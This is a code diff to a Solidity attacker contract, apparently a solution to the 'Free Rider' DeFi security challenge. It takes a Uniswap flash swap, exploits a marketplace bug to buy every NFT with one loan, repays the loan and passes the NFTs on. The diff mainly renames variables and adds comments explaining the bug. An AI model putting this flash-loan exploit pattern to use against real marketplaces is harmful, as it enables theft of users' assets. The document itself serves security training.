@@ -5,7 +5,7 @@ import "./FreeRiderNFTMarketplace.sol";
 import "@openzeppelin/contracts/utils/Strings.sol";
 import "./FreeRiderBuyer.sol";
 
-interface UniswapV2Pair is IERC721Receiver{
+interface UniswapV2Pair {
     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
 }
 
@@ -27,7 +27,7 @@ contract FreeRiderAttacker is IUniswapV2Callee {
     IWETH9 private weth;
     ERC721 public nft;
     FreeRiderBuyer public buyer;
-    uint256[] private ids = [0, 1, 2, 3, 4, 5];
+    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];
 
     constructor(address _uniswapPairAddress,
         address payable _marketPlace,
@@ -42,8 +42,7 @@ contract FreeRiderAttacker is IUniswapV2Callee {
         buyer = FreeRiderBuyer(_buyer);
     }
 
-    // send the 0.5 eth for interest
-    function getFlashSwap(uint256 amount) external payable{
+    function attack(uint256 amount) external payable{
         //get a flash swap (loan)
         uniswapPair.swap(amount, 0, address(this), new bytes(1));
     }
@@ -51,25 +50,17 @@ contract FreeRiderAttacker is IUniswapV2Callee {
     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
         // exchange the loaned weth to eth
         weth.withdraw(amount0);
-        // buy all nft with a single 15eth loan, because of the bug in the marketplace contract
-        marketPlace.buyMany{value: address(this).balance}(ids);
+        // buy all nfts for free with a single 15 eth loan, because of the bug in the marketplace contract
+        // that incorrectly determines the seller's address as the buyer's in line 80
+        marketPlace.buyMany{value: address(this).balance}(tokenIds);
         // exchange back the 15 eth to weth
         weth.deposit{value: address(this).balance}();
-        // pay back the flashswap + interest
+        // pay back the flash loan
         weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));
-        //approve all nfts for buyer
-        nft.setApprovalForAll(address(buyer), true);
-                require(
-                nft.isApprovedForAll(address(this), address(buyer)),
-                    "Not All approved for buyer!"
-                );
         //transfer them to buyer
-        nft.safeTransferFrom(address(this), address(buyer), 0);
-        nft.safeTransferFrom(address(this), address(buyer), 1);
-        nft.safeTransferFrom(address(this), address(buyer), 2);
-        nft.safeTransferFrom(address(this), address(buyer), 3);
-        nft.safeTransferFrom(address(this), address(buyer), 4);
-        nft.safeTransferFrom(address(this), address(buyer), 5);
+        for (uint256 i = 0; i < tokenIds.length; i++) {
+            nft.safeTransferFrom(address(this), address(buyer), i);
+        }
     }
 
     function onERC721Received(
